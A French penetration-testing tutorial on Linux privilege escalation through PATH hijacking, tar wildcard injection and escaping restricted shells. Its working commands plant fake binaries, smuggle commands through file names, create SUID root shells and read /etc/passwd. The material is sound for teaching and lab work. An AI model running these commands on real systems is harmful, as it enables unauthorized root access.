# Abus de l'environnement

La variable PATH, les wildcards dans les commandes et les shells restreints constituent des vecteurs d'escalade souvent sous-estimes. Ils ne reposent pas sur des vulnerabilites logicielles mais sur des erreurs de configuration que l'on rencontre regulierement en environnement de production.

## Pourquoi

Les administrateurs ecrivent des scripts et des taches planifiees sans toujours maitriser les subtilites de l'environnement shell. Un script qui appelle `tar` sans chemin absolu, un cron job qui utilise des wildcards, ou un shell restreint mal configure : ces situations offrent des opportunites d'escalade qui passent sous le radar des outils automatises.

## Comment ca marche

### Manipulation du PATH

Quand un binaire ou un script est appele sans son chemin absolu, le systeme le cherche dans les repertoires listes dans la variable `PATH`, dans l'ordre. Si un attaquant peut ecrire dans un repertoire qui precede le repertoire du binaire legitime, il peut placer un fichier malveillant portant le meme nom.

Ce vecteur est exploitable quand :
- Un binaire SUID ou un script execute par root appelle une commande sans chemin absolu
- L'attaquant peut modifier la variable PATH ou ecrire dans un repertoire present dans le PATH

### Abus de wildcards

Certains utilitaires interpretent les noms de fichiers comme des arguments. L'exemple classique est `tar` avec les options `--checkpoint` et `--checkpoint-action`. Si un cron job execute `tar *` dans un repertoire ou l'attaquant peut creer des fichiers, il suffit de creer des fichiers nommes comme des options de `tar` pour injecter des commandes.

### Evasion de shells restreints

Les shells restreints (`rbash`, `rksh`, `rzsh`) limitent les actions de l'utilisateur : interdiction de changer de repertoire, d'utiliser des chemins absolus, de rediriger la sortie. Mais ces restrictions sont souvent contournables.

| Restriction | Technique de contournement |
|---|---|
| Pas de `/` dans les commandes | Utiliser des builtins comme `echo` pour explorer |
| Pas de `cd` | Lister avec `echo /*` |
| Commandes limitees | Injection de commandes via des syntaxes alternatives |
| PATH restreint | Appeler les binaires via des interpretes autorises |

## En pratique

### Manipulation du PATH

```bash
# - Identifier un script SUID qui appelle une commande sans chemin absolu
cat /usr/local/bin/suid_script.sh
# Contenu : service apache2 restart
# "service" est appele sans chemin absolu

# - Creer un faux binaire "service"
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# - Modifier le PATH pour que /tmp soit consulte en premier
export PATH=/tmp:$PATH

# - Executer le script SUID
/usr/local/bin/suid_script.sh
# On obtient un shell root
```

{% hint style="warning" %}
Cette technique fonctionne uniquement si le script SUID ne definit pas son propre PATH au debut de l'execution (comme `PATH=/usr/bin:/bin`). Verifier le contenu du script avant de tenter l'exploitation.
{% endhint %}

### Abus de wildcards avec tar

```bash
# - Scenario : un cron job root execute periodiquement
# cd /home/user/backup && tar czf /tmp/backup.tar.gz *

# - Creer les fichiers "arguments" dans le repertoire surveille
echo '' > '/home/user/backup/--checkpoint=1'
echo '' > '/home/user/backup/--checkpoint-action=exec=sh shell.sh'

# - Creer le script a executer
echo '#!/bin/bash' > /home/user/backup/shell.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/backup/shell.sh
chmod +x /home/user/backup/shell.sh

# - Attendre l'execution du cron job, puis
/tmp/rootbash -p
```

Le wildcard `*` dans la commande tar s'expend en :
```
tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh file1.txt file2.txt
```

Les noms de fichiers `--checkpoint=1` et `--checkpoint-action=exec=sh shell.sh` sont interpretes comme des options par `tar`.

{% hint style="info" %}
Cette technique est egalement applicable a d'autres utilitaires qui acceptent des options commencant par `--` dans les arguments. `rsync`, par exemple, supporte `--rsh` qui peut etre exploite de maniere similaire.
{% endhint %}

### Evasion de shells restreints

{% tabs %}
{% tab title="Injection de commandes" %}
```bash
# - Utiliser l'injection de commandes via des builtins
echo test && /bin/bash
echo test | /bin/bash

# - Substitution de commandes
$(bash)
`bash`

# - Enchainement
;/bin/bash
```
{% endtab %}
{% tab title="Exploration avec echo" %}
```bash
# - Lister les repertoires (quand ls est interdit)
echo /*
echo /home/*

# - Lire un fichier (quand cat est interdit)
while read line; do echo $line; done < /etc/passwd
```
{% endtab %}
{% tab title="Via des interpretes" %}
```bash
# - Si python est disponible
python3 -c 'import os; os.system("/bin/bash")'

# - Si perl est disponible
perl -e 'exec "/bin/bash";'

# - Si awk est disponible
awk 'BEGIN {system("/bin/bash")}'

# - Si vi/vim est disponible
vi
# Puis :set shell=/bin/bash
# Puis :shell
```
{% endtab %}
{% tab title="Via SSH" %}
```bash
# - Se reconnecter en SSH avec un shell complet
ssh user@localhost -t "bash --noprofile"

# - Ou forcer le shell via SSH
ssh user@localhost -t "/bin/bash"
```
{% endtab %}
{% endtabs %}

{% hint style="success" %}
La premiere etape face a un shell restreint est de comprendre quelles commandes et builtins sont disponibles. Tester systematiquement : `echo`, `printf`, `export`, les operateurs (`|`, `&&`, `;`), les interpretes (Python, Perl, awk), et les editeurs (vi, ed).
{% endhint %}

## Pieges et galeres

- **PATH reinitialise** : beaucoup de scripts securises commencent par `PATH=/usr/bin:/bin` ou utilisent `env_reset` dans sudoers. La manipulation du PATH ne fonctionne que si le script herite du PATH de l'utilisateur
- **Wildcards et espaces** : les noms de fichiers contenant des espaces ou des caracteres speciaux peuvent empecher l'expansion correcte. Tester avec des noms simples
- **rbash et PATH fixe** : rbash fixe souvent le PATH a un repertoire restreint (`/home/user/bin`). On ne peut pas le modifier, mais on peut parfois exploiter les binaires presents dans ce repertoire
- **Cron et environnement** : les cron jobs s'executent avec un environnement minimal. Les variables d'environnement de l'utilisateur ne sont pas heritees par defaut
- **Detection** : la creation de fichiers nommes `--checkpoint*` ou la modification du PATH peuvent etre detectees par des solutions EDR

## Memo express

| Technique | Commande |
|---|---|
| Verifier le PATH | `echo $PATH` |
| Creer un faux binaire | `echo '/bin/bash -p' > /tmp/cmd && chmod +x /tmp/cmd` |
| Modifier le PATH | `export PATH=/tmp:$PATH` |
| Tar wildcard (fichiers) | `echo '' > '--checkpoint=1'` |
| Lire un fichier en rbash | `while read l; do echo $l; done < fichier` |
| Explorer en rbash | `echo /*` |
| Shell via Python | `python3 -c 'import os; os.system("/bin/bash")'` |
| Shell via SSH | `ssh user@localhost -t "bash --noprofile"` |

***
